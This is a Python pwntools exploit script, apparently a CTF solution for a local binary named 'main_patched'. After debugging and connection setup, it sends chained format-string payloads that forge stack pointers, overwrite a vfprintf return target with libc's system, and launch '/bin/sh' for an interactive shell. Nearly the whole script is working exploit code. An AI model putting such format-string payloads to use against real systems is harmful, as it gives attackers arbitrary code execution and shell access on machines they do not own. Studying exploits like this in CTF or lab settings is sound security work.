
#!/usr/bin/env python3
from ctypes import CDLL
import time
from subprocess import Popen
from pwncli import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './main_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "127.0.0.1", 5000


gdbscript = '''
init-pwndbg
b *vfprintf+328
b *printf+160
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "./main"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, aslr=False)
    else:
        return process([exe] + argv, aslr=False)

def debug():
    global gdbscript, pid
    if not args.REMOTE and not args.GDB:
        if args.QEMU:
            gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
            for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
                gdb_args.extend(["-ex", cmd])
            Popen(gdb_args)
        elif args.DOCKER:
            gdbscript = f'''
            init-pwndbg
            set sysroot /proc/{pid}/root
            b *main+133
            b *printf
            b *main
            c
            '''.format(**locals())        
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='main_patched')
        else:
            attach(io, gdbscript=gdbscript)

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda data,num           :u32(io.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(io.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))


# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()

    with log.progress("Making pointer to printf+160 then return to fgets main"), context.silent:
        payload = b""
        payload += b"%c"*80 + b"%*.hhd" #One Byte Stack Address
        payload += f"%{0xd768 - 0x25f5}c".encode()
        payload += b"%c"*5 + b"%hn"
        payload += f"%{0xcb}c".encode()
        payload += b"%c"*12 + b"%hhn"
        sleep(0.2)
        sl(payload)

    with log.progress("Making another pointer to vfprintf+328"), context.silent:
        payload = b""
        payload += b"%c"*69 + b"%*.hhd" #One Byte Stack Addres
        payload += f"%{0xd688 - 0x25e7}c".encode()
        payload += b"%c"*2 + b"%hn"

        payload += f"%{0x9d}c".encode()
        payload += b"%c"*26 + b"%hhn"
        sleep(0.2)
        sl(payload)

    with log.progress("Overwrite vfprintf+328 -> system"), context.silent:
        payload = b""
        payload += b"%c"*72 + b"%*.d" #Four Byte Libc Address
        payload += f"%{libc.sym.system - 0x20452}c".encode()
        payload += b"%c"*25 + b"%n"
        payload += b"/bin/sh >&2\0"
        debug()
        sleep(0.2)
        sl(payload)
    io.interactive()

if __name__ == '__main__':
    exploit()
